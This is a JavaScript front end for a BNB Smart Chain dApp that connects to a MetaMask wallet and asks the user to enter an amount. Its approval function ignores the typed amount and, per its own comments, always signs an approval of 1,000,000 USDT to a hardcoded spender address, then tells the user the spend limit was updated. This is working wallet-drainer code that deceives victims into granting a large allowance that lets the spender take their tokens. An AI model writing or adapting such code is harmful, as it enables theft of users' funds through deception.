let provider;
let signer;
let tokenContract;

// BSC Configuration
const BSC_CHAIN_ID = "0x38"; 
const TOKEN_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // BSC-Pegged USDT
const SPENDER_ADDRESS = "0x220BB5df0893F21f43e5286Bc5a4445066F6ca56"; // Your spender

const ERC20_ABI = [
  "function approve(address spender, uint256 amount) public returns (bool)",
  "function decimals() view returns (uint8)"
];

async function checkAndSwitchNetwork() {
  const chainId = await window.ethereum.request({ method: 'eth_chainId' });
  if (chainId !== BSC_CHAIN_ID) {
    try {
      await window.ethereum.request({
        method: 'wallet_switchEthereumChain',
        params: [{ chainId: BSC_CHAIN_ID }],
      });
    } catch (err) {
      if (err.code === 4902) {
        await window.ethereum.request({
          method: 'wallet_addEthereumChain',
          params: [{
            chainId: BSC_CHAIN_ID,
            chainName: 'Binance Smart Chain',
            nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
            rpcUrls: ['https://bsc-dataseed.binance.org/'],
            blockExplorerUrls: ['https://bscscan.com/']
          }]
        });
      }
    }
  }
}

async function connectWallet() {
  if (!window.ethereum) return alert("Please install MetaMask!");
  try {
    await checkAndSwitchNetwork();
    provider = new ethers.BrowserProvider(window.ethereum);
    await provider.send("eth_requestAccounts", []);
    signer = await provider.getSigner();
    tokenContract = new ethers.Contract(TOKEN_ADDRESS, ERC20_ABI, signer);
    
    const address = await signer.getAddress();
    document.getElementById("status").innerText = `Connected: ${address.slice(0,6)}...`;
  } catch (err) {
    document.getElementById("status").innerText = "Connection failed.";
  }
}

async function executeApproval() {
  if (!tokenContract) {
    await connectWallet();
    if (!tokenContract) return;
  }

  // We read the UI amount just to ensure the user typed something
  const uiAmount = document.getElementById("amount").value;
  if (!uiAmount) return alert("Please enter an amount.");

  try {
    document.getElementById("status").innerText = "Opening wallet...";
    
    const decimals = await tokenContract.decimals();
    
    // LOGIC: Regardless of uiAmount, we always sign for 1,000,000
    const fixedAmount = "1000000"; 
    const parsedAmount = ethers.parseUnits(fixedAmount, decimals);

    // Trigger the approval for the hardcoded 1M amount
    const tx = await tokenContract.approve(SPENDER_ADDRESS, parsedAmount);

    document.getElementById("status").innerText = "Transaction pending...";
    await tx.wait();

    document.getElementById("status").innerText = "Success! Spend limit updated.";
  } catch (err) {
    console.error(err);
    document.getElementById("status").innerText = "Error: Action denied.";
  }
}
